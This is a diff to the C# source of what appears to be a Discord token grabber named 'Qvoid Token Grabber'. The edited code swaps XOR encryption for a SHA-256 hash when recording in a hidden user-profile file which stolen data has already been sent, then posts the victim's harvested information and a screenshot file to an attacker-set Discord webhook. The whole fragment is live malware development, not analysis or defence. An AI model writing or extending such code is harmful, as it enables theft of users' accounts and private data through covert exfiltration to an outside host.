@@ -371,10 +371,10 @@ namespace Qvoid_Token_Grabber.Discord
 
                 //Checking if the user already run the token grabber before, if he did we compare it to the content if the content has changed we update all the information, else we just return quz we have nothing to do :D
                 string usersPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\d0060d24-c4a5-480f-803a-ec978344350d.dat";
-                if (!File.Exists(usersPath) || (QvoidWrapper.Encryption.StrXOR(HeadMessage + BodyMessage, Config.Password, true) != File.ReadAllText(usersPath)))
+                if (!File.Exists(usersPath) || (QvoidWrapper.Encryption.ComputeSha256Hash(HeadMessage + BodyMessage) != File.ReadAllText(usersPath)))
                 {
                     //Writing the log file.
-                    File.WriteAllText(usersPath, QvoidWrapper.Encryption.StrXOR(HeadMessage + BodyMessage, Config.Password, true));
+                    File.WriteAllText(usersPath, QvoidWrapper.Encryption.ComputeSha256Hash(HeadMessage + BodyMessage));
 
                     QvoidWrapper.Discord.Webhook Webhook = new QvoidWrapper.Discord.Webhook(Config.Webhook);
                     QvoidWrapper.Discord.Embed embed = new QvoidWrapper.Discord.Embed();
@@ -411,7 +411,7 @@ namespace Qvoid_Token_Grabber.Discord
                     Webhook.Send(embed);
                     Thread.Sleep(30);
                     Webhook.Send(embed2);
-                    
+
                     if (File.Exists(ss_Name))
                     {
                         Thread.Sleep(30);
